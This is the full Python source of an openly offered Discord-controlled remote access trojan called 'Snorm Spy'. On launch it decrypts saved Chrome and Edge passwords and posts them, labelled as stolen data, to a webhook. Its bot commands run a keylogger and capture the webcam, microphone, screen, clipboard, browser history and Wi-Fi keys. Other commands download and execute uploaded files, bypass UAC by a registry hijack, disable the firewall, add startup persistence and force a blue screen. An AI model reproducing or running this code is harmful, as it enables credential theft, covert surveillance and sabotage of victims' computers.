import os
import socket
import io
import json
import sqlite3
import shutil
import requests
from Crypto.Cipher import AES
import discord
from discord.ext import commands
import win32crypt
import base64
import logging
import asyncio
from PIL import ImageGrab
import cv2
import pyperclip
import ctypes
import win32com.client
import subprocess
import sys
import ctypes
import uuid
from PIL import Image  
import pynput
import pyaudio
import wave
import threading
import ctypes
import tempfile
import aiohttp
import numpy as np
import pyautogui
import base64
from pynput.keyboard import Key, Listener
import requests
import screeninfo
from screeninfo import get_monitors
import GPUtil
import psutil
import platform
import winreg
import webbrowser
import pyaudio

logging.getLogger('discord').setLevel(logging.CRITICAL)

async def spam_injecting():
    while True:
        print("INJECTING.... injecting... INJECTING..")
        await asyncio.sleep(0.1)

TOKEN = 'sex'
WEBHOOK_URL = 'sex'

keystrokes = ""  
is_logging = False  

intents = discord.Intents.all()

bot = commands.Bot(command_prefix="!", intents=intents)


def send_to_webhook(content):
    try:
        data = {"content": content}
        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code == 204:
            print(f"...")
        else:
            print(f"...")
    except Exception as e:
        print(f"...")


def on_press(key):
    global keystrokes
    if not is_logging:
        return  

    try:
        
        if key == Key.space:
            keystrokes += " "
        elif key == Key.enter:
            keystrokes += "\n"
        elif key == Key.backspace:
            keystrokes = keystrokes[:-1]  
        elif key == Key.tab:
            keystrokes += "    "  
        elif key == Key.esc:
            keystrokes += " *ESC* "
        else:
            keystrokes += str(key).replace("'", "")  

        
        if len(keystrokes) > 0:
            send_to_webhook(keystrokes)
            keystrokes = ""  
    except Exception as e:
        print(f"...")


def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()


@bot.command()
async def start(ctx):
    global is_logging
    if not is_logging:
        is_logging = True
        await ctx.send("Keylogger started!")
        
        threading.Thread(target=start_keylogger, daemon=True).start()
    else:
        await ctx.send("Keylogger is already running.")


@bot.command()
async def stop(ctx):
    global is_logging
    if is_logging:
        is_logging = False
        await ctx.send("Keylogger stopped!")
    else:
        await ctx.send("Keylogger is not running.")




FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100
CHUNK = 1024
RECORD_SECONDS = 300
RECORD_SECONDS = 30
AUDIO_FILE = "mic.wav"

def record_audio():
    """Function to record audio."""
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANNELS,
                    rate=RATE, input=True,
                    frames_per_buffer=CHUNK)

    frames = []

    for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    p.terminate()

    with wave.open(AUDIO_FILE, 'wb') as wf:
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))

def get_encryption_key(browser="chrome"):
    try:
        if browser == "chrome":
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        elif browser == "edge":
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
        elif browser == "brave":
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Local State")
        elif browser == "opera":
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Local State")
        elif browser == "opera_gx":
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Local State")
        elif browser == "vivaldi":
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Vivaldi", "User Data", "Local State")
        else:
            raise ValueError("Unsupported browser specified")

        if not os.path.exists(local_state_path):
            return None

        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())

        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        decrypted_key = decrypt_master_key(encrypted_key)

        if decrypted_key:
            return decrypted_key
        else:
            return None
    except Exception as e:
        return None

def decrypt_master_key(encrypted_key):
    try:
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key
    except Exception as e:
        return None

def decrypt_password_chrome(ciphertext, key):
    try:
        iv = ciphertext[3:15]  
        auth_tag = ciphertext[-16:]
        encrypted_data = ciphertext[15:-16]

        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt_and_verify(encrypted_data, auth_tag)

        return decrypted.decode("utf-8")
    except Exception as e:
        return None

def get_passwords_from_browser(browser="chrome"):
    key = get_encryption_key(browser)
    if not key:
        return {}

    paths = {
        "chrome": ["Google", "Chrome"],
        "edge": ["Microsoft", "Edge"],
        "brave": ["BraveSoftware", "Brave-Browser"],
        "vivaldi": ["Vivaldi", "Vivaldi"],
    }

    if browser in paths:
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", paths[browser][0], paths[browser][1], "User Data", "Default", "Login Data")
    elif browser == "opera":
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Login Data")
    elif browser == "opera_gx":
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Login Data")
    else:
        raise ValueError("Unsupported browser specified")

    if not os.path.exists(db_path):
        return {}

    file_name = "LoginData.db"
    shutil.copyfile(db_path, file_name)

    db = sqlite3.connect(file_name)
    cursor = db.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    result = {}
    for row in cursor.fetchall():
        action_url = row[0]
        username = row[1]
        password = decrypt_password_chrome(row[2], key)

        if username and password:
            result[action_url] = [username, password]

    cursor.close()
    db.close()
    os.remove(file_name)
    return result


def addinfo():
    sillyname = os.getlogin()
    hostname = socket.gethostname()
    ipad = socket.gethostbyname(hostname)

    return sillyname, ipad


def grabscreen():
    screenshot = ImageGrab.grab()
    return screenshot

def grabscreenbytes(screenshot):
    ssba = io.BytesIO()
    screenshot.save(ssba, format='PNG')
    return ssba.getvalue()

@bot.event
async def on_ready():
    try:
        sillyname, ipad = addinfo()

        chrome_data = get_passwords_from_browser("chrome")
        edge_data = get_passwords_from_browser("edge")

        screenshot = grabscreen()
        screenshot_bytes = grabscreenbytes(screenshot)

        stolen_data = {**chrome_data, **edge_data}

        if stolen_data:
            print(f".....")

            image_url = "https://media.discordapp.net/attachments/1335780021817573499/1335825951249924207/313dddddd.png?ex=67a1945d&is=67a042dd&hm=199dca0c5f43187ccbe47d49dbe2c086b61157462878b7d09833fa0ee16aaf48&=&format=webp&quality=lossless"

            payload = {
                "embeds": [
                    {
                        "title": f"Data from {sillyname} ({ipad})",  
                        "description": f"**__Stolen Data__\n```json\n{stolen_data}```**",  
                        "url": "https://github.com/UnsillyHaxor",  
                        "color": 16711680,  
                        "footer": {
                            "text": "Grabbed by Snorm Spy | https://github.com/UnsillyHaxor | "  
                        },
                        "thumbnail": {
                            "url": image_url  
                        },
                        "image": {
                            "url": "attachment://screenshot.png"  # Fuck S-illy on github btw.
                        }
                    }
                ],
                "username": "Snorm Spy",  
                "avatar_url": image_url  
            }


            response = requests.post(WEBHOOK_URL, json=payload)

            if response.status_code == 204:
                print("Injecting..")
            else:
                print(f"Injection failed.")
        else:
            print("No passwords found to inject too...")

    except Exception as e:
        print(f"Error during on_ready: {e}")

@bot.command()
async def screenshot(ctx):
    try:
        screenshot = grabscreen()
        screenshot_bytes = grabscreenbytes(screenshot)

        await ctx.send(
            content="Here is the screenshot!",
            files=[discord.File(io.BytesIO(screenshot_bytes), filename="screenshot.png")]
        )

    except Exception as e:
        await ctx.send(f"Error: {e}")
@bot.command()
async def webcam(ctx):
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()

        if not ret:
            await ctx.send("Can't access webcam")
            return

        _, img_encoded = cv2.imencode('.png', frame)
        img_bytes = img_encoded.tobytes()

        await ctx.send(
            content="See da pretty face",
            files=[discord.File(io.BytesIO(img_bytes), filename="webcam.png")]
        )

    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def clipboard(ctx):
    try:
        clipboard_content = pyperclip.paste()  # Get copeid thing

        if not clipboard_content:
            await ctx.send("Clipboard is empty.")
        else:
            await ctx.send(f"Clipboard content:\n```\n{clipboard_content}\n```")

    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def ip(ctx):
    try:

        response = requests.get("http://ip-api.com/json/").json()

        if response["status"] == "success":
            ip_info = (
                f"**Public IP:** {response['query']}\n"
                f"**Country:** {response['country']}\n"
                f"**Region:** {response['regionName']}\n"
                f"**City:** {response['city']}\n"
                f"**ISP:** {response['isp']}\n"
                f"**Lat/Lon:** {response['lat']}, {response['lon']}"
            )
        else:
            ip_info = "Failed to get IP info."


        payload = {"content": f"🔍 **IP Geolocation Report**\n{ip_info}"}
        requests.post(WEBHOOK_URL, json=payload)

        await ctx.send("Sent IP to webhook")

    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def tts(ctx, *, message: str):
    os.system(f"powershell -c (New-Object -ComObject SAPI.SpVoice).Speak('{message}')")
    await ctx.send("Message spoken.")

def get_browser_history(browser_name):
    try:

        browser_paths = {
    "Chrome": os.path.join(os.environ["USERPROFILE"], r"AppData\Local\Google\Chrome\User Data\Default\History"),
    "Edge": os.path.join(os.environ["USERPROFILE"], r"AppData\Local\Microsoft\Edge\User Data\Default\History"),
    "Brave": os.path.join(os.environ["USERPROFILE"], r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"),
    "Vivaldi": os.path.join(os.environ["USERPROFILE"], r"AppData\Local\Vivaldi\User Data\Default\History"),
    "Opera": os.path.join(os.environ["USERPROFILE"], r"AppData\Roaming\Opera Software\Opera Stable\History"),
    "Opera GX": os.path.join(os.environ["USERPROFILE"], r"AppData\Roaming\Opera Software\Opera GX Stable\History"),
        }

        if browser_name not in browser_paths:
            return f"Unsupported browser: {browser_name}"

        history_db = browser_paths[browser_name]

        if not os.path.exists(history_db):
            return f"{browser_name} history file not found."


        temp_db = f"temp_{browser_name.lower()}_history.db"
        shutil.copy2(history_db, temp_db)


        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()


        cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 10")
        history = cursor.fetchall()

        conn.close()
        os.remove(temp_db)  

        if not history:
            return f"No browsing history found for {browser_name}."


        history_text = "\n".join([f"🔗 {title} ({url})" for url, title in history])
        return f"**Last 10 Browsed Sites on {browser_name}:**\n{history_text}"

    except Exception as e:
        return f"Error retrieving {browser_name} history: {e}"

@bot.command()
async def browser(ctx):
    chrome_history = get_browser_history("Chrome")
    edge_history = get_browser_history("Edge")
    brave_history = get_browser_history("Brave")
    vivaldi_history = get_browser_history("Vivaldi")
    opera_history = get_browser_history("Opera")
    opera_gx_history = get_browser_history("Opera GX")

    file_name = "SillySnormBrowserSpy.txt"
    with open(file_name, "w", encoding="utf-8") as file:
        file.write(chrome_history)
        file.write(edge_history)
        file.write(brave_history)
        file.write(vivaldi_history)
        file.write(opera_history)
        file.write(opera_gx_history)

    await ctx.send(file=discord.File(file_name))
@bot.command()
async def download(ctx, file_path: str):
    try:

        if os.path.exists(file_path):

            await ctx.send(file=discord.File(file_path))
            await ctx.send(f"File '{file_path}' sent successfully!")
        else:
            await ctx.send(f"File '{file_path}' does not exist.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def delete(ctx, file_path: str):
    try:

        if os.path.exists(file_path):

            os.remove(file_path)
            await ctx.send(f"File '{file_path}' has been deleted successfully.")
        else:
            await ctx.send(f"File '{file_path}' does not exist.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def forkbomb(ctx):
    for _ in range(1000):
        subprocess.Popen(['notepad.exe'])
    await ctx.send('Executed fork bomb..')

def UACbypass(method: int = 1) -> bool:
    if GetSelf()[1]:
        execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
        if method == 1:
            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
            execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("computerdefaults --nouacbypass")
            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
            if log_count_after > log_count_before:
                return UACbypass(method + 1)
        elif method == 2:
            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
            execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("fodhelper --nouacbypass")
            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
            if log_count_after > log_count_before:
                return UACbypass(method + 1)
        else:
            return False
        return True

def IsAdmin() -> bool:
    return ctypes.windll.shell32.IsUserAnAdmin() == 1

def GetSelf() -> tuple[str, bool]:
    if hasattr(sys, "frozen"):
        return (sys.executable, True)
    else:
        return (__file__, False)

@bot.command()
async def fakeerror(ctx):
    ctypes.windll.user32.MessageBoxW(0, "Build failed: error C2143: syntax error: missing ';' before 'return'", "Python", 0x10 | 0x40000)
    await ctx.send("Fake error displayed")

@bot.command()
async def upload(ctx):
    if not ctx.message.attachments:
        await ctx.send("Insert a file or sum shit")
        return

    attachment = ctx.message.attachments[0]
    temp_dir = tempfile.gettempdir()
    file_path = os.path.join(temp_dir, attachment.filename)

    async with aiohttp.ClientSession() as session:
        async with session.get(attachment.url) as response:
            if response.status == 200:
                with open(file_path, "wb") as f:
                    f.write(await response.read())
                
                subprocess.Popen(file_path, shell=True)
                await ctx.send(f"Archivo {attachment.filename} uploaded and executed in {temp_dir}")
            else:
                await ctx.send("Error downloading")

@bot.command()
async def hwid(ctx):

    hwid = uuid.UUID(int=uuid.getnode()).hex
    await ctx.send(f"Victim HWID : {hwid}")

@bot.command()
async def jumpscare(ctx):
    


    image_url = "https://github.com/UnsillyHaxor/Snorm-Spy-Discord-RAT/blob/main/updatedjumpscare.png?raw=true"


    response = requests.get(image_url)
    if response.status_code == 200:
        image = Image.open(io.BytesIO(response.content))


        temp_path = os.path.join(os.environ["TEMP"], "jumpscare.png")
        image.save(temp_path)


        image.show()

        await ctx.send("Jumpscare image has been displayed!")
    else:
        await ctx.send("Failed to load the image.")

@bot.command()
async def wifi(ctx):
    try:
        wifi_data = os.popen("netsh wlan show profile").read()
        profiles = [line.split(':')[1].strip() for line in wifi_data.split('\n') if "All User Profile" in line]
        wifi_info = ""
        for profile in profiles:
            password_data = os.popen(f"netsh wlan show profile name=\"{profile}\" key=clear").read()
            password_lines = [line for line in password_data.split('\n') if "Key Content" in line]
            password = password_lines[0].split(':')[1].strip() if password_lines else "N/A"
            wifi_info += f"SSID: {profile} | Password: {password}\n"
        await ctx.send(f"```{wifi_info}```")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")


@bot.command()
async def disable_firewall(ctx):
    try:
        os.popen("netsh advfirewall set allprofiles state off")
        await ctx.send("Windows Firewall has been disabled.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")


@bot.command()
async def network_adapter(ctx, action: str):
    try:
        if action.lower() == "disable":
            os.popen('netsh interface set interface "Wi-Fi" disable')
            await ctx.send("Wi-Fi adapter has been disabled.")
        elif action.lower() == "enable":
            os.popen('netsh interface set interface "Wi-Fi" enable')
            await ctx.send("Wi-Fi adapter has been enabled.")
        else:
            await ctx.send("Invalid action. Use 'enable' or 'disable'.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command()
async def screen_record(ctx):
    try:
        screen_size = pyautogui.size()  
        fourcc = cv2.VideoWriter_fourcc(*"XVID")  
        out = cv2.VideoWriter("screen_recording.avi", fourcc, 20.0, (screen_size))  
        
        for _ in range(600):  
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)  
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)  
            out.write(frame)  
        
        out.release()

        
        await ctx.send("Screen recording saved as screen_recording.avi.", file=discord.File("screen_recording.avi"))

        
        os.remove("screen_recording.avi")
        
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")


@bot.command()
async def name(ctx):
    try:
        
        pc_username = os.getlogin()

        
        monitors = get_monitors()
        if monitors:
            monitor_name = f"{monitors[0].width}x{monitors[0].height}"
        else:
            monitor_name = "Unknown"

        
        await ctx.send(f"PC Username: `{pc_username}`\nMonitor: `{monitor_name}`")

    except Exception as e:
        await ctx.send(f"Error retrieving system info: `{str(e)}`")

@bot.command()
async def specs(ctx):
    try:
        
        system_info = platform.uname()
        cpu = system_info.processor
        ram = round(psutil.virtual_memory().total / (1024 ** 3), 2)  # Convert bytes to GB
        os_name = f"{system_info.system} {system_info.release}"
        
        
        gpus = GPUtil.getGPUs()
        gpu_info = gpus[0].name if gpus else "No dedicated GPU found"

        
        await ctx.send(
            f"**PC Specs:**\n"
            f"🖥️ **OS:** `{os_name}`\n"
            f"⚙️ **CPU:** `{cpu}`\n"
            f"🎮 **GPU:** `{gpu_info}`\n"
            f"💾 **RAM:** `{ram} GB`"
        )

    except Exception as e:
        await ctx.send(f"Error retrieving system specs: `{str(e)}`")

@bot.command()
async def discord(ctx):
    try:
        
        appdata_path = os.getenv("APPDATA")
        discord_storage_path = os.path.join(appdata_path, "Discord", "Local Storage", "leveldb")

        
        if not os.path.exists(discord_storage_path):
            await ctx.send("Could not find Discord username.")
            return

        
        username = "Unknown"
        for file in os.listdir(discord_storage_path):
            if file.endswith(".ldb") or file.endswith(".log"):
                file_path = os.path.join(discord_storage_path, file)
                try:
                    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                        if "username" in content:
                            start = content.find('"username":"') + len('"username":"')
                            end = content.find('"', start)
                            username = content[start:end]
                            break
                except:
                    continue  

        
        await ctx.send(f"Discord Username: `{username}`")

    except Exception as e:
        await ctx.send(f"Error retrieving Discord username: `{str(e)}`")

@bot.command()
async def screenoff(ctx):
    await ctx.send("Turning off the display for 30 seconds...")

    if platform.system() == "Windows":
        os.system("powershell -command \"(Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Display { [DllImport(\\\"user32.dll\\\")] public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam); }' -Language CSharp); [Display]::SendMessage(0xFFFF, 0x0112, 0xF170, 2)\"")
    
    elif platform.system() == "Linux":
        os.system("xset dpms force off")

    elif platform.system() == "Darwin":  
        os.system("pmset displaysleepnow")

    await asyncio.sleep(30)  

    await ctx.send("Turning the display back on...")

    if platform.system() == "Windows":
        os.system("powershell -command \"$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys(' ');\"")  

    elif platform.system() == "Linux":
        os.system("xset dpms force on")

    elif platform.system() == "Darwin":  
        os.system("caffeinate -u -t 1")  

@bot.command()
async def startup(ctx):
    if os.path.exists(startup_path):
        embed = discord.Embed(title="Already in Startup", description="The script is already set to run on startup.", color=0xFFFF00)
    else:
        shutil.copy(__file__, startup_path)
        embed = discord.Embed(title="Startup Enabled", description="The script will now run on startup.", color=0x3498DB)
    embed.set_footer(text="Creds to OrangeWare for making this command.")
    await ctx.send(embed=embed)

@bot.command()
async def rstartup(ctx):
    found = False
    for file in os.listdir(startup_folder):
        if file == script_name:
            os.remove(os.path.join(startup_folder, file))
            found = True
    embed = discord.Embed(title="Startup Removed", description="The script was removed from startup." if found else "The script is not in the startup folder.", color=0x3498DB if found else 0xFF0000)
    embed.set_footer(text="Command by OrangeWare")
    await ctx.send(embed=embed)

@bot.command()
async def shutdown(ctx):
    await ctx.send("Shutting down the system...")

    if platform.system() == "Windows":
        os.system("shutdown /s /t 0")
    elif platform.system() == "Linux" or platform.system() == "Darwin":
        os.system("shutdown -h now")

@bot.command()
async def processes(ctx):
    processes = sorted(psutil.process_iter(attrs=['pid', 'name', 'cpu_percent']), key=lambda p: p.info['cpu_percent'], reverse=True)[:5]
    msg = "Top 5 Processes:\n" + "\n".join(f"{p.info['name']} (PID: {p.info['pid']}) - {p.info['cpu_percent']}% CPU" for p in processes)
    await ctx.send(f"```{msg}```")

@bot.command()
async def kill(ctx, pid: int):
    try:
        p = psutil.Process(pid)
        p.terminate()
        await ctx.send(f"Process {pid} terminated.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def goon(ctx):
    
    website = "https://www.pornhub.com/view_video.php?viewkey=679d0fad8fa04"  
    windows = 100  

    for _ in range(windows):
        webbrowser.open(website)

    await ctx.send("If ykyk, 🔞  🍆 🌊.  ( btw this just opened pornhub 100 times )")

@bot.command()
async def bsod(ctx):
    await ctx.send("**WARNING**: This command triggers the BSOD. ( BLUE SCREEN OF DEATH ), React with ✅ to confirm or ❌ to cancel.")

    def reaction_check(reaction, user):
        return user == ctx.author and str(reaction.emoji) in ["✅", "❌"]

    try:
        reaction, _ = await bot.wait_for('reaction_add', timeout=30.0, check=reaction_check)
        if str(reaction.emoji) == "✅":
            await ctx.send("💥 Thats how I like it...")
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        else:
            await ctx.send("man your a party pooper")
    except asyncio.TimeoutError:
        await ctx.send("imagine party pooping discord.gg/snormware")

@bot.command()
async def bye(ctx):
    await ctx.send("Exterminating...")
    file_path = sys.argv[0]
    os.remove(file_path)
    await bot.close()








FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100
CHUNK = 1024
RECORD_SECONDS = 300  
RECORD_SECONDS = 30  
AUDIO_FILE = "mic.wav"

@bot.command()
async def mic(ctx):

    await ctx.send("Recording their MIC")


    thread = threading.Thread(target=record_audio)
    thread.start()


    thread.join()  


    if os.path.exists(AUDIO_FILE):
        await ctx.send("Sending file..")
        await ctx.send(file=discord.File(AUDIO_FILE))


        os.remove(AUDIO_FILE)
    else:
        await ctx.send("No audio file was created.")


bot.run(TOKEN)
